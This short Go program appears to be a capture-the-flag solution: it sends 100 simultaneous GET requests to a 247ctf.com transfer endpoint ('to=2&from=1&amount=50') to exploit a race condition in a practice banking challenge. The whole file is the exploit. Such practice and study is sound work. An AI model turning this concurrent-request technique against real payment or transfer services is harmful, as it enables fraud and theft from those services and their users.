package main

import (
	"net/http"
	"time"
)

func main() {
	url := "https://ddb7654ea1421390.247ctf.com/?to=2&from=1&amount=50"

	for i := 0; i < 100; i++ {
		go func() {
			http.Get(url)
		}()
	}

	time.Sleep(1 * time.Second)
}
